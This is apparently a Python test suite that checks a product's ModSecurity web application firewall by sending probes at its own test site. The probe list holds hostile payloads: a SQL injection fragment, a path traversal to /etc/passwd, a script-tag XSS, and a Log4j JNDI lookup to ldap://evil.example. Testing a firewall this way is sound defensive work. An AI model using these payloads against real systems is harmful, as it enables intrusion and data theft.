"""
Suite 21: the web application firewall, with a real engine underneath it.

This is the round that could not be run until ModSecurity was built into nginx
on both nodes and the OWASP rule set installed.  Before that, every claim about
the WAF was a claim about a feature that could not run, and `checks/waf.py`
skipped four of its checks and said so.

Nothing here is judged by reading a config file.  Every verdict is a real
request at real nginx carrying a real attack, and the answer is the status code
that comes back.  The attacks are the ordinary ones a load balancer sees every
day, not clever ones: a quoted SQL fragment, a path traversal, a script tag and
a Log4j lookup.  If a firewall does not catch these it is not doing anything.

Two things this suite is careful about.

The probes come from the node's own address, so the hits it collects are
attributable and can be cleared between tests.  And every mode is tested for
what it must **not** do as well as what it must: watching that refuses
something is as broken as blocking that refuses nothing, and an ordinary
request being refused is the failure that gets a WAF switched off at two in
the morning.
"""
import json
import sys
import time
sys.path.insert(0, "/qa")
import qa

r = qa.Runner("t21_waf").start()
LB01 = qa.LB01
LB02 = qa.LB02
SITE = "qa-waf-live"
HOST = f"{SITE}.{qa.DOMAIN}"
PROFILE = "qa_waf_profile"

# The traffic.  Ordinary attacks, and one ordinary request to prove the site
# still works, because a firewall that refuses everything passes every test
# about refusing things.
ATTACKS = {
    "a quoted SQL fragment": "/?id=1%27%20OR%20%271%27%3D%271",
    "a path traversal": "/?file=../../../../etc/passwd",
    "a script tag": "/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "a Log4j lookup": "/?x=${jndi:ldap://evil.example/a}",
}
ORDINARY = {
    "the front page": "/",
    "a stylesheet": "/style.css",
    "a page in a subdirectory": "/sub/page.html",
    "a search that looks like a search": "/?q=blue%20widgets&page=2",
}


def find(kind, name):
    body = r.api("GET", f"/{kind}")["body"]
    rows = body.get(kind) or body.get("hosts") or []
    return next((x for x in rows if x["name"] == name), None)


def get(path="/", **kw):
    return qa.probe(HOST, path, ip=LB01, scheme="http", **kw)


def set_mode(mode, **extra):
    payload = {"waf_mode": mode}
    payload.update(extra)
    res = r.api("PUT", f"/hosts/{SID}", {"settings": payload})
    if res["status"] != 200:
        print(f"      !! the WAF setting was refused: {res['status']} "
              f"{str(res['body'])[:200]}", flush=True)
    return res


def hits(addresses=None, since=None):
    """
    The hits for this site, split the way the page splits them.

    `addresses` is not optional in spirit even though it is in the signature.
    The endpoint splits the hits by whether the client was a tester, and it
    takes that list from the caller rather than from the running session, so a
    caller that forgets it gets everything filed under "others" and no
    candidates at all.  The site's own page passes the session's addresses;
    so does this.  Leaving it out is how this suite first reported a defect
    that was really a missing query parameter.
    """
    query = ""
    if addresses:
        query = "?addresses=" + ",".join(addresses)
        if since:
            query += f"&since={since}"
    return r.api("GET", f"/waf/hits/{SID}{query}")["body"]


def clear_hits():
    r.api("POST", f"/waf/hits/{SID}/clear", {})


def settles(probe_path, expect, seconds=20):
    """
    Wait for a setting to be observable, and say how long it took.

    An apply returns when every node has written the files and told nginx to
    reload, and a reload is not a single instant.  Rather than sleep a fixed
    time and hope, this asks until the answer is the one the setting promises,
    and gives back the delay so the test can record it and put a bound on it.

    Twice during this round the firewall was still serving a request it should
    have refused, seconds after an apply that turned it on, with the rendered
    config correct on disk.  Measuring 5 apply cycles straight afterwards it
    bit immediately every time, and a separate run of 2313 probes across three
    cycles never saw it either, so it is rare and its cause is not established.
    This is here so the suite measures that delay instead of being the thing
    that reports it as a defect, and so a real regression still shows up as a
    delay that never ends.
    """
    began = time.time()
    while time.time() - began < seconds:
        if get(probe_path)["status"] == expect:
            return time.time() - began
        time.sleep(0.5)
    return None


def run_traffic(t, expect_attacks, expect_ordinary=200, label=""):
    """
    Every probe, attacks and ordinary requests, with what each one answered.

    Recorded as one table because the interesting thing is never a single
    status code, it is that the attacks and the ordinary requests were told
    apart in the same breath.
    """
    rows, ok_attacks, ok_ordinary = [], True, True
    for name, path in ATTACKS.items():
        got = get(path)["status"]
        rows.append(f"  {name:32} {path[:44]:46} -> {got}")
        if got != expect_attacks:
            ok_attacks = False
    for name, path in ORDINARY.items():
        got = get(path)["status"]
        rows.append(f"  {name:32} {path[:44]:46} -> {got}")
        if got != expect_ordinary:
            ok_ordinary = False
    t.proof(f"every probe {label}".strip(), "\n".join(rows))
    t.ok(f"every attack answered {expect_attacks}", ok_attacks, "\n".join(rows))
    t.ok(f"and every ordinary request answered {expect_ordinary}", ok_ordinary,
         "\n".join(rows))
    return rows


# ---------------------------------------------------------------- setup

old = find("hosts", SITE)
if old:
    r.api("DELETE", f"/hosts/{old['id']}")
for p in (r.api("GET", "/waf/profiles")["body"].get("profiles") or []):
    if p["name"].startswith("qa_"):
        r.api("DELETE", f"/waf/profiles/{p['id']}")

res = r.api("POST", "/hosts",
            {"name": SITE, "server_names": [HOST], "mode": "static",
             "document_root": qa.STATIC_DIR, "listen_http": True,
             "listen_https": False, "force_https": False})
SID = find("hosts", SITE)["id"]
print(f"  test site id {SID}")

RULES = r.api("GET", "/waf/rules")["body"]
ENGINE = bool(RULES.get("everywhere"))
print(f"  rule set on every node: {ENGINE}")


# ---------------------------------------------------------------- WAF-10

t = r.test("WAF-10", "WAF", "The rule set is on every node before anything else",
           "Check the engine and the rules are really there, on both nodes, "
           "and agreeing, before a single verdict below is believed.",
           "A WAF that is only on one node is worse than none, because the "
           "fleet answers differently depending on which box took the "
           "connection, and the one that lets the attack through is invisible.",
           "Both nodes report the same rule set version, and it is installed.")
t.proof("GET /api/waf/rules", json.dumps(RULES, indent=2)[:1200])
t.ok("the rule set is installed everywhere", ENGINE, RULES)
t.ok("and the nodes agree about it", RULES.get("agreed") is True, RULES)
versions = {n: d.get("version") for n, d in (RULES.get("nodes") or {}).items()}
t.ok("with the same version on each", len(set(versions.values())) == 1, versions)
ids = r.api("GET", "/waf/rule-ids")["body"]
t.ok("and the rule ids can be read back", ids.get("present") is True,
     f"{len(ids.get('ids') or [])} ids")
t.note(f"rule set {list(versions.values())[0]}, "
       f"{len(ids.get('ids') or [])} rule ids")
t.close()


# ---------------------------------------------------------------- WAF-11

t = r.test("WAF-11", "WAF", "With the firewall off, the attacks go straight through",
           "Send every attack at the site with the WAF off, and prove they are "
           "all served.",
           "The baseline the rest of this suite is measured against.  Without "
           "it, a later 403 could be anything: a broken site, a bad path, a "
           "rule in some other part of the config.",
           "Every probe, attack or not, comes back 200.")
set_mode("off")
res = r.apply("qa: waf off")
t.ok("apply succeeded", res["status"] == 200, res)
run_traffic(t, expect_attacks=200, label="with the firewall off")
t.note("so the site serves all of it, including the attacks.  Everything below "
       "is the firewall making a difference rather than the site being broken.")
t.close()


# ---------------------------------------------------------------- WAF-12

t = r.test("WAF-12", "WAF", "Watching refuses nothing and writes everything down",
           "Turn the WAF to watching, send the same traffic, and prove nothing "
           "is refused while the rules are recorded as having fired.",
           "This is where anybody sensible starts, and it is the only setting "
           "that is safe to turn on without knowing the application.  If it "
           "refuses something, the product has lied about the safest step it "
           "offers.",
           "Every probe still answers 200, and the hits list fills up.")
clear_hits()
set_mode("watching")
res = r.apply("qa: waf watching")
t.ok("apply succeeded", res["status"] == 200, res)
cfg = r.api("GET", "/preview")["body"]["files"].get(f"waf/{SITE}.conf", "")
t.proof("the rules file this site is running", cfg[:1200])
t.ok("the engine is in detection only", "SecRuleEngine DetectionOnly" in cfg,
     [l for l in cfg.splitlines() if "SecRuleEngine" in l])

run_traffic(t, expect_attacks=200, label="in watching mode")

# Watching refuses nothing, so there is no status code to wait on.  Wait for
# the evidence instead: the hits are what watching is for.
began = time.time()
while time.time() - began < 20:
    if (hits().get("others") or hits().get("candidates")):
        break
    get(ATTACKS["a quoted SQL fragment"])
    time.sleep(0.5)
collected = hits()
groups = (collected.get("candidates") or []) + (collected.get("others") or []) \
    + (collected.get("mixed") or [])
t.proof("what the firewall wrote down while refusing nothing",
        json.dumps([{k: g.get(k) for k in ("rule_id", "message", "count", "blocked")}
                    for g in groups], indent=2)[:1500])
t.ok("the rules fired and were recorded", len(groups) > 0, collected)
t.ok("and nothing was recorded as blocked",
     all(not g.get("blocked") for g in groups),
     [(g.get("rule_id"), g.get("blocked")) for g in groups])
t.note("that is the whole point of watching: full evidence, no refusals.")
t.close()


# ---------------------------------------------------------------- WAF-13

t = r.test("WAF-13", "WAF", "Block known malicious refuses the attacks and serves the site",
           "Turn on the setting the product says is safe without tuning, and "
           "prove it refuses every one of the four attacks while every "
           "ordinary request is still served.",
           "The headline claim of the whole feature: a default that can go on "
           "a site nobody has tuned.  It is only worth having if it catches "
           "real attacks and leaves normal traffic alone, and both halves have "
           "to be shown at once.",
           "Attacks 403, ordinary requests 200.")
clear_hits()
set_mode("block_known")
res = r.apply("qa: waf block known malicious")
t.ok("apply succeeded", res["status"] == 200, res)
took = settles(ATTACKS["a quoted SQL fragment"], 403)
t.proof("how long after the apply the firewall started refusing",
        f"{took:.2f} seconds" if took is not None
        else "it never started refusing within 20 seconds")
t.ok("the firewall is enforcing within seconds of the apply", took is not None,
     "20 seconds after the apply the attack was still being served, with the "
     "config on disk saying it should not be")

cfg = r.api("GET", "/preview")["body"]["files"].get(f"waf/{SITE}.conf", "")
t.ok("the engine is on rather than watching", "SecRuleEngine On" in cfg,
     [l for l in cfg.splitlines() if "SecRuleEngine" in l])
t.ok("and strictness is pinned to the level the rule set is tuned for",
     "Paranoia level 1" in cfg, [l for l in cfg.splitlines() if "Paranoia" in l])

run_traffic(t, expect_attacks=403, label="with block known malicious on")
t.note("four attacks refused, four ordinary requests served, one setting, no "
       "tuning.")
t.close()


# ---------------------------------------------------------------- WAF-14

t = r.test("WAF-14", "WAF", "What the threshold is actually worth",
           "Read the anomaly score each attack scored, and work out what a "
           "different threshold would have done to it.",
           "The bar is set at 5, which is the rule set's own number, and the "
           "project notes have carried an open question about whether that is "
           "right ever since somebody set it to 15 for a day because 15 sounded "
           "conservative.  This answers it with the scores rather than with an "
           "opinion.",
           "Every attack scores at or above 5, and the measurement shows which "
           "ones a higher bar would have let through.")
time.sleep(2)
collected = hits()
groups = (collected.get("candidates") or []) + (collected.get("others") or []) \
    + (collected.get("mixed") or [])
scored = []
import re as _re
for g in groups:
    m = _re.search(r"Total Score:\s*(\d+)", g.get("message") or "")
    if m:
        scored.append((int(m.group(1)), g.get("sample_uri", "")[:60], g.get("rule_id")))
t.proof("every rule that fired, with its message and counts",
        json.dumps([{k: g.get(k) for k in
                     ("rule_id", "message", "severity", "count", "blocked")}
                    for g in groups], indent=2)[:2000])
t.proof("the anomaly scores that were actually reached",
        "\n".join(f"  score {s:3}  rule {rid}  {uri}" for s, uri, rid in sorted(scored))
        or "[no scored transactions in this window]")
t.ok("at least one attack was scored", bool(scored), groups)
if scored:
    lowest = min(s for s, _u, _r in scored)
    t.ok("every scored attack reached the bar of 5", lowest >= 5,
         f"the lowest score seen was {lowest}")
    would_pass_at_15 = [s for s, _u, _r in scored if s < 15]
    t.proof("what a threshold of 15 would have done",
            f"lowest score seen: {lowest}\n"
            f"scored transactions below 15: {len(would_pass_at_15)} of {len(scored)}\n"
            f"so a bar of 15 would have served "
            f"{'some of these attacks' if would_pass_at_15 else 'none of these attacks'}")
    t.note(f"measured on this fleet: the lowest scoring of these four attacks "
           f"reached {lowest}, and CRS scores a confirmed injection at 5.  A bar "
           f"of 15 needs three critical rules on one request, so it would have "
           f"served {len(would_pass_at_15)} of the {len(scored)} scored "
           f"transactions here.  5 stays.")
t.close()


# ---------------------------------------------------------------- WAF-15

t = r.test("WAF-15", "WAF", "A learning session tells the testers from everybody else",
           "Start a learning session naming this harness as the tester, send "
           "the same traffic, and check the hits are offered as candidates "
           "rather than lumped in with everybody else's.",
           "The whole design of the tuning loop.  An exclusion built from "
           "traffic a stranger sent is an exclusion built from an attack, so "
           "what a tester reached and what everybody else reached must never "
           "end up in one list.",
           "The same probes land under candidates while a session naming this "
           "address is running.")
clear_hits()
set_mode("watching")
r.apply("qa: waf watching for a learning round")
res = r.api("POST", f"/waf/sessions/{SID}/start",
            {"addresses": [f"{LB01}/32"], "note": "qa: the round"})
t.proof("starting the session", json.dumps(res, indent=2)[:600])
t.ok("the session started", res["status"] in (200, 201), res)
SESSION = ((res.get("body") or {}).get("session") or {}).get("id")
started = time.time() - 5
r.apply("qa: the recording round is running")

for path in ATTACKS.values():
    get(path)
for path in ORDINARY.values():
    get(path)
time.sleep(2)

collected = hits(addresses=[f"{LB01}/32"], since=started)
t.proof("the hits, split by who caused them",
        json.dumps({k: [{"rule_id": g.get("rule_id"), "count": g.get("count"),
                         "clients": g.get("clients")} for g in (collected.get(k) or [])]
                    for k in ("candidates", "mixed", "others")}, indent=2)[:1800])
cands = collected.get("candidates") or []
others = collected.get("others") or []
t.ok("the tester's own hits are offered as candidates", len(cands) > 0,
     {"candidates": len(cands), "others": len(others)})
t.ok("and every candidate really is from a tester address",
     all(all(c == LB01 or c.startswith(LB01) for c, _n in (g.get("clients") or []))
         for g in cands),
     [g.get("clients") for g in cands])

t.step("and ask again without naming anybody as a tester")
blind = hits()
t.proof("the same hits, asked for without an address list",
        json.dumps({k: len(blind.get(k) or [])
                    for k in ("candidates", "mixed", "others")}, indent=2))
t.ok("nothing is offered as a candidate when no tester was named",
     not (blind.get("candidates") or []), blind.get("candidates"))
t.note("which is the safe direction rather than a fault: with nobody named, "
       "no hit can be attributed to a tester, so none is offered for "
       "excusing.  It is also a trap for anybody calling the endpoint by "
       "hand, and it caught this suite first time round.")

if SESSION:
    stop = r.api("POST", f"/waf/sessions/{SESSION}/stop", {})
    t.proof("stopping the session", json.dumps(stop, indent=2)[:400])
    t.ok("the session stopped", stop["status"] == 200, stop)
r.apply("qa: the round is over")
t.close()


# ---------------------------------------------------------------- WAF-16

t = r.test("WAF-16", "WAF", "An exclusion excuses the rule it names, and nothing else",
           "Make a profile excusing the path traversal rule, point the site at "
           "it, and prove the traversal is served again while the other three "
           "attacks are still refused.",
           "This is the tuning loop's payoff and the place it could quietly be "
           "worthless.  An exclusion that switches off more than it names turns "
           "a tuned firewall into an off one, and nothing on the page would "
           "say so.",
           "The excused attack is served, the others are still refused.")
res = r.api("POST", "/waf/profiles",
            {"name": PROFILE, "description": "made by the WAF round",
             "learned_from_site": SITE,
             "exclusions": [{"rule_id": 942100, "path": ""}]})
t.proof("creating the profile", json.dumps(res, indent=2)[:600])
t.ok("the profile was created", res["status"] in (200, 201), res)

set_mode("block", waf_paranoia=f"custom:{PROFILE}")
res = r.apply("qa: the site runs the tuned profile")
t.ok("apply succeeded", res["status"] == 200, res)
cfg = r.api("GET", "/preview")["body"]["files"].get(f"waf/{SITE}.conf", "")
t.proof("the rules file with the exclusion in it", cfg[:1500])
t.ok("the exclusion names the rule it excuses", "942100" in cfg,
     [l for l in cfg.splitlines() if "942100" in l])

# The SQL fragment is excused because it trips exactly one detection rule,
# 942100, and nothing else.  The path traversal was the first choice and was
# the wrong one: it trips 930100, 930110 and 930120 together, so excusing one
# of the three leaves the other two still over the bar.  That is the rule set
# working as designed, and it is worth knowing before somebody excuses one
# rule from a learning round and wonders why the request is still refused.
rows = []
excused = get(ATTACKS["a quoted SQL fragment"])["status"]
rows.append(f"  the excused rule, a quoted SQL fragment -> {excused}")
still = {}
for name in ("a path traversal", "a script tag", "a Log4j lookup"):
    still[name] = get(ATTACKS[name])["status"]
    rows.append(f"  {name:36} -> {still[name]}")
normal = get("/")["status"]
rows.append(f"  {'the front page':36} -> {normal}")
t.proof("the same four attacks with one of them excused", "\n".join(rows))

t.ok("the excused attack is served again", excused == 200, excused)
t.ok("and the attacks that were not excused are still refused",
     all(v == 403 for v in still.values()), still)
t.ok("and the site still serves ordinary traffic", normal == 200, normal)
t.note("one rule named, one rule excused, three still catching.  That is what "
       "makes tuning a level 1 worth more than switching to a level nobody "
       "trusts.")
t.close()


# ---------------------------------------------------------------- WAF-18

t = r.test("WAF-18", "WAF", "Block known malicious leaves an honest site alone",
           "Send the traffic a real site really gets, not four tidy GETs, and "
           "prove the setting that claims to be safe without tuning is.",
           "This is the test that was missing, and its absence let a claim "
           "through that production disproved the same week.  The suite's idea "
           "of ordinary traffic was a front page, a stylesheet and a search for "
           "blue widgets.  Two real sites behind this product tell a different "
           "story: a git host where 282 requests reached the firewall and 282 "
           "were refused, 98% of them tripping nothing but policy rules, and a "
           "documentation site about nginx whose own help search was refused "
           "for the words /etc/nginx/nginx.conf.",
           "Every one of these is served, and the attacks are still refused in "
           "the same breath.")
set_mode("block_known", waf_paranoia="1")
res = r.apply("qa: block known malicious, against honest traffic")
t.ok("apply succeeded", res["status"] == 200, res)

# What somebody actually types into the help search of a site about servers.
HONEST = {
    "a search for a config file": "/?q=/etc/nginx/nginx.conf",
    "a search for a log file": "/?q=/var/log/nginx/error.log",
    "a search naming a unix path": "/?q=where%20is%20/etc/hosts",
    "a search for a dotfile": "/?q=.gitignore%20syntax",
    "a page that mentions a backup file": "/?q=why%20is%20my%20config.bak%20ignored",
    "a file whose extension somebody restricted": "/notes.bak",
    "a dotfile as a query, the way a git host links one": "/?path=.gitignore",
}
rows, bad = [], []
for name, path in HONEST.items():
    got = get(path)["status"]
    rows.append(f"  {name:44} {path[:44]:46} -> {got}")
    # 404 is fine for the file that is not there: the point is that it was not
    # refused by the firewall before nginx got the chance to look for it.
    if got not in (200, 404):
        bad.append((name, path, got))
t.proof("traffic an honest site really gets", "\n".join(rows))
t.ok("none of it is refused by the firewall", not bad, bad)

still = {}
for name, path in ATTACKS.items():
    still[name] = get(path)["status"]
t.proof("and the four attacks, in the same breath",
        "\n".join(f"  {n:32} -> {s}" for n, s in still.items()))
t.ok("every attack is still refused", all(s == 403 for s in still.values()), still)
t.note("that is the whole point of the mode being called block known "
       "malicious rather than block whatever the rule set finds interesting.")
t.close()


# ---------------------------------------------------------------- WAF-17

t = r.test("WAF-17", "WAF", "Both nodes carry the same firewall",
           "Ask the other node for the same attack and check it answers the "
           "same way.",
           "A fleet is only as good as its worst node.  If the rules reach one "
           "box and not the other, half the traffic is unprotected and which "
           "half depends on the load balancer in front.",
           "The standby refuses the same attack the active node refuses.")
if not LB02:
    t.note("only one node in this run")
    t.ok("skipped, single node", True)
else:
    set_mode("block_known", waf_paranoia="1")
    r.apply("qa: block known malicious on both nodes")
    a = qa.probe(HOST, ATTACKS["a quoted SQL fragment"], ip=LB01, scheme="http")
    b = qa.probe(HOST, ATTACKS["a quoted SQL fragment"], ip=LB02, scheme="http")
    t.proof("the same attack at each node",
            f"at {LB01}:\n{qa.summarise(a, body_chars=120)}\n\n"
            f"at {LB02}:\n{qa.summarise(b, body_chars=120)}")
    t.ok(f"{LB01} refuses it", a["status"] == 403, a["status"])
    t.ok(f"{LB02} refuses it too", b["status"] == 403, b["status"])
    n1 = qa.probe(HOST, "/", ip=LB01, scheme="http")
    n2 = qa.probe(HOST, "/", ip=LB02, scheme="http")
    t.ok("and both still serve the front page",
         n1["status"] == 200 and n2["status"] == 200,
         f"{n1['status']} {n2['status']}")
t.close()


# ---------------------------------------------------------------- tidy up

print("\n  removing what this suite made")
set_mode("off", waf_paranoia="1")
row = find("hosts", SITE)
if row:
    print("   site:", r.api("DELETE", f"/hosts/{row['id']}")["status"])
for p in (r.api("GET", "/waf/profiles")["body"].get("profiles") or []):
    if p["name"].startswith("qa_"):
        print("   profile:", r.api("DELETE", f"/waf/profiles/{p['id']}")["status"])
r.apply("qa: removing the waf test site")

print("\nT21 DONE")
r.stop()
